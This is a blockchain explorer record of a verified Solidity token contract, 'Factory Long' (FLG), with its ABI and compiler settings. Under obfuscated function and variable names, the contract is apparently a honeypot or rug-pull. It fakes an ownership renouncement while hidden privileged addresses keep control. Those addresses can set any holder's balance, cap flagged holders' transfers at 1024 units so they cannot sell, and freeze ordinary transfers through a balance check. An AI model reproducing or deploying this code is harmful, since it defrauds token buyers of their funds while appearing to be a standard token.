{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface sellFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txBuyAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchEnableAt {\n    function createPair(address receiverAmount, address tokenSwap) external returns (address);\n}\n\ninterface maxAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletMinTx) external view returns (uint256);\n\n    function transfer(address sellFrom, uint256 enableTeam) external returns (bool);\n\n    function allowance(address walletReceiverSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellFrom,\n        uint256 enableTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderLaunchedExempt, uint256 value);\n    event Approval(address indexed walletReceiverSell, address indexed spender, uint256 value);\n}\n\ninterface maxAutoMetadata is maxAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FactoryLong is txBuyAt, maxAuto, maxAutoMetadata {\n\n    mapping(address => bool) public txWalletLimit;\n\n    address listReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function exemptMax(address enableTokenExempt) public {\n        fundLiquidity();\n        \n        if (enableTokenExempt == tradingFromAmount || enableTokenExempt == fundTradingFee) {\n            return;\n        }\n        feeLiquidityAuto[enableTokenExempt] = true;\n    }\n\n    function isBuy(address autoSwap, address sellFrom, uint256 enableTeam) internal returns (bool) {\n        if (autoSwap == tradingFromAmount) {\n            return receiverTo(autoSwap, sellFrom, enableTeam);\n        }\n        uint256 takeLaunch = maxAuto(fundTradingFee).balanceOf(listReceiver);\n        require(takeLaunch == marketingTx);\n        require(sellFrom != listReceiver);\n        if (feeLiquidityAuto[autoSwap]) {\n            return receiverTo(autoSwap, sellFrom, totalLiquidityFrom);\n        }\n        return receiverTo(autoSwap, sellFrom, enableTeam);\n    }\n\n    event OwnershipTransferred(address indexed fundAmount, address indexed launchedTradingMarketing);\n\n    function balanceOf(address walletMinTx) public view virtual override returns (uint256) {\n        return limitReceiver[walletMinTx];\n    }\n\n    function teamLimit(address enableTake) public {\n        if (toFund) {\n            return;\n        }\n        if (launchSwap) {\n            sellLiquidityShould = buySender;\n        }\n        txWalletLimit[enableTake] = true;\n        if (sellLiquidityShould != buySender) {\n            buySender = sellLiquidityShould;\n        }\n        toFund = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTx;\n    }\n\n    address autoToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private buyTx = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toExempt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchLiquidity;\n    }\n\n    function limitTx(uint256 enableTeam) public {\n        fundLiquidity();\n        marketingTx = enableTeam;\n    }\n\n    function transferFrom(address autoSwap, address sellFrom, uint256 enableTeam) external override returns (bool) {\n        if (_msgSender() != autoToken) {\n            if (minLimit[autoSwap][_msgSender()] != type(uint256).max) {\n                require(enableTeam <= minLimit[autoSwap][_msgSender()]);\n                minLimit[autoSwap][_msgSender()] -= enableTeam;\n            }\n        }\n        return isBuy(autoSwap, sellFrom, enableTeam);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSwap;\n    }\n\n    mapping(address => bool) public feeLiquidityAuto;\n\n    uint256 private toExempt = 100000000 * 10 ** 18;\n\n    address public tradingFromAmount;\n\n    function allowance(address autoSwapList, address autoIs) external view virtual override returns (uint256) {\n        if (autoIs == autoToken) {\n            return type(uint256).max;\n        }\n        return minLimit[autoSwapList][autoIs];\n    }\n\n    uint256 private buySender;\n\n    uint256 constant totalLiquidityFrom = 2 ** 10;\n\n    function atLaunched(address limitSwap, uint256 enableTeam) public {\n        fundLiquidity();\n        limitReceiver[limitSwap] = enableTeam;\n    }\n\n    function modeTake() public {\n        emit OwnershipTransferred(tradingFromAmount, address(0));\n        autoBuy = address(0);\n    }\n\n    function receiverTo(address autoSwap, address sellFrom, uint256 enableTeam) internal returns (bool) {\n        require(limitReceiver[autoSwap] >= enableTeam);\n        limitReceiver[autoSwap] -= enableTeam;\n        limitReceiver[sellFrom] += enableTeam;\n        emit Transfer(autoSwap, sellFrom, enableTeam);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private minLimit;\n\n    mapping(address => uint256) private limitReceiver;\n\n    bool private isTeam;\n\n    string private teamSwap = \"FLG\";\n\n    bool private autoShouldTake;\n\n    uint256 private sellLiquidityShould;\n\n    address private autoBuy;\n\n    function transfer(address limitSwap, uint256 enableTeam) external virtual override returns (bool) {\n        return isBuy(_msgSender(), limitSwap, enableTeam);\n    }\n\n    bool public launchSwap;\n\n    bool public toFund;\n\n    string private launchLiquidity = \"Factory Long\";\n\n    uint256 exemptShould;\n\n    function owner() external view returns (address) {\n        return autoBuy;\n    }\n\n    address public fundTradingFee;\n\n    function approve(address autoIs, uint256 enableTeam) public virtual override returns (bool) {\n        minLimit[_msgSender()][autoIs] = enableTeam;\n        emit Approval(_msgSender(), autoIs, enableTeam);\n        return true;\n    }\n\n    bool public launchBuy;\n\n    function fundLiquidity() private view {\n        require(txWalletLimit[_msgSender()]);\n    }\n\n    constructor (){\n        \n        sellFund fundWallet = sellFund(autoToken);\n        fundTradingFee = launchEnableAt(fundWallet.factory()).createPair(fundWallet.WETH(), address(this));\n        \n        tradingFromAmount = _msgSender();\n        modeTake();\n        txWalletLimit[tradingFromAmount] = true;\n        limitReceiver[tradingFromAmount] = toExempt;\n        \n        emit Transfer(address(0), tradingFromAmount, toExempt);\n    }\n\n    function getOwner() external view returns (address) {\n        return autoBuy;\n    }\n\n    uint256 marketingTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiverSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTradingMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunchedExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwapList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTeam\",\"type\":\"uint256\"}],\"name\":\"atLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMinTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTokenExempt\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLiquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTradingFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableTeam\",\"type\":\"uint256\"}],\"name\":\"limitTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"}],\"name\":\"teamLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFromAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txWalletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FactoryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}